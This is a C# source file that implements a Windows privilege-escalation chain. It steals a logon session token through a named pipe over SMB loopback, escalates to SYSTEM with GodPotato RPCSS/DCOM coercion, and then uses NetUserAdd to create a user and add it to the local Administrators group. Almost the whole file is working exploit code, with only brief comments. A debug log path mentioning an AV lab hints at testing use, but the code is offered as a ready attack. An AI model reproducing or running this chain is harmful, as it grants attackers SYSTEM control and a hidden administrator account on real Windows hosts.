// Token Theft + GodPotato chain for escalation WITHOUT SeImpersonatePrivilege
// Step 1: Named pipe + SMB loopback → recover stored logon session token (has SeImpersonate)
// Step 2: While impersonating that token, run GodPotato RPCSS coercion → SYSTEM
// Step 3: NetUserAdd in-process as SYSTEM
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using GodPotato.NativeAPI;
using SharpToken;

[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
struct TTC_UI1 { public string name, password; public uint age, priv; public string home, comment; public uint flags; public string script; }
[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
struct TTC_LGM3 { public string domainandname; }

namespace GodPotato {
public class SqlTokenTheftChain {
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern IntPtr CreateNamedPipe(string n, uint om, uint pm, uint mx, uint ob, uint ib, uint t, IntPtr sa);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool ConnectNamedPipe(IntPtr p, IntPtr o);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern IntPtr CreateFile(string n, uint acc, uint sh, IntPtr sa, uint cd, uint fl, IntPtr t2);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool ReadFile(IntPtr h, byte[] b, uint n, ref uint r, IntPtr o);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool WriteFile(IntPtr h, byte[] b, uint n, ref uint w, IntPtr o);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateNamedPipeClient(IntPtr p);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool os, ref IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr src, uint a, IntPtr at, int il, int tp, ref IntPtr dup);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern void Sleep(uint ms);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateEvent(IntPtr sa, bool m, bool i, IntPtr n);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool SetEvent(IntPtr h);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, ref uint tid);
    [DllImport("netapi32.dll", CharSet=CharSet.Unicode)]
    static extern int NetUserAdd(string s, uint l, ref TTC_UI1 b, out uint p);
    [DllImport("netapi32.dll", CharSet=CharSet.Unicode)]
    static extern int NetLocalGroupAddMembers(string s, string g, uint l, ref TTC_LGM3 b, uint c);

    static void L(string path, string msg) { try { System.IO.File.AppendAllText(path, msg + "\n"); } catch {} }

    delegate uint ThreadProc(IntPtr p);
    static ThreadProc s_sp;
    static volatile IntPtr s_pipe = IntPtr.Zero, s_logonToken = IntPtr.Zero, s_event = IntPtr.Zero;
    static volatile string s_log = "";

    static uint PipeServerThread(IntPtr _) {
        IntPtr pipe = s_pipe;
        ConnectNamedPipe(pipe, IntPtr.Zero);
        byte[] buf = new byte[4]; uint nr = 0;
        ReadFile(pipe, buf, 4, ref nr, IntPtr.Zero);
        if (ImpersonateNamedPipeClient(pipe)) {
            IntPtr ttok = IntPtr.Zero;
            if (OpenThreadToken(GetCurrentThread(), 0xF01FF, true, ref ttok)) {
                IntPtr dup = IntPtr.Zero;
                if (DuplicateTokenEx(ttok, 0x02000000, IntPtr.Zero, 2, 1, ref dup))
                    s_logonToken = dup;
                CloseHandle(ttok);
            }
            RevertToSelf();
        }
        SetEvent(s_event);
        return 0;
    }

    public static void Run(string cmd) {
        string logPath = @"C:\avlab\ttchain_debug.txt";
        s_log = logPath;
        try {
            System.IO.File.WriteAllText(logPath, "CHAIN_START\n");

            // ── Step 1: Token theft via SMB loopback ──────────────────────
            string id    = Guid.NewGuid().ToString("N").Substring(0, 8);
            string local = @"\\.\pipe\" + id;
            string smb   = @"\\localhost\pipe\" + id;

            IntPtr pipe = CreateNamedPipe(local, 3, 0, 255, 4096, 4096, 0, IntPtr.Zero);
            if (pipe == new IntPtr(-1)) { L(logPath, "PIPE_FAIL"); return; }
            s_pipe  = pipe;
            s_event = CreateEvent(IntPtr.Zero, false, false, IntPtr.Zero);

            s_sp = PipeServerThread; uint tid = 0;
            CreateThread(IntPtr.Zero, 0, Marshal.GetFunctionPointerForDelegate(s_sp), IntPtr.Zero, 0, ref tid);
            Sleep(150);

            // Connect via SMB loopback — kernel uses stored logon session token
            IntPtr client = CreateFile(smb, 0xC0000000u, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
            if (client != new IntPtr(-1)) {
                byte[] ping = new byte[]{ 0x41 }; uint nw = 0;
                WriteFile(client, ping, 1, ref nw, IntPtr.Zero);
                CloseHandle(client);
            }

            WaitForSingleObject(s_event, 10000);
            CloseHandle(pipe); CloseHandle(s_event);
            L(logPath, "LOGON_TOKEN=" + (s_logonToken != IntPtr.Zero));
            if (s_logonToken == IntPtr.Zero) return;

            // ── Step 2: Impersonate stored token → run GodPotato → SYSTEM ─
            bool imp = ImpersonateLoggedOnUser(s_logonToken);
            L(logPath, "IMP_LOGON=" + imp);
            if (!imp) { CloseHandle(s_logonToken); return; }

            // Now running with the stored logon session token (has SeImpersonatePrivilege)
            // Run GodPotato RPCSS/DCOM coercion to get SYSTEM token
            WindowsIdentity systemIdentity = null;
            try {
                var ctx = new GodPotatoContext(new System.IO.StringWriter(), Guid.NewGuid().ToString());
                ctx.HookRPC();
                ctx.Start();
                var trigger = new GodPotatoUnmarshalTrigger(ctx);
                try { trigger.Trigger(); } catch {}
                systemIdentity = ctx.GetToken();
                L(logPath, "GP_TOKEN_NULL=" + (systemIdentity == null) + (systemIdentity != null ? " name=" + systemIdentity.Name : ""));
                ctx.Restore(); ctx.Stop();
            } catch(Exception ex) { L(logPath, "GP_EX=" + ex.GetType().Name); }

            RevertToSelf(); // back to original process token
            CloseHandle(s_logonToken);

            if (systemIdentity == null) return;

            // ── Step 3: Use SYSTEM token → NetUserAdd ─────────────────────
            bool imp2 = ImpersonateLoggedOnUser(systemIdentity.Token);
            L(logPath, "IMP_SYSTEM=" + imp2);
            if (imp2) {
                string[] parts = cmd.Split(new char[]{' '}, StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length >= 4 && cmd.Contains("/add")) {
                    var u = new TTC_UI1 { name=parts[2], password=parts[3], priv=1, flags=0x201 };
                    uint parm = 0;
                    int rc = NetUserAdd(null, 1, ref u, out parm);
                    L(logPath, "NETUSER_ADD=" + rc);
                    if (rc == 0) {
                        var g = new TTC_LGM3 { domainandname=parts[2] };
                        int rc2 = NetLocalGroupAddMembers(null, "Administrators", 3, ref g, 1);
                        L(logPath, "NETGROUP=" + rc2);
                    }
                }
                RevertToSelf();
                L(logPath, "DONE");
            }
        } catch(Exception ex) {
            try { L(logPath, "OUTER_EX=" + ex.GetType().Name + ":" + ex.Message.Substring(0, Math.Min(80, ex.Message.Length))); } catch {}
        }
    }
}}
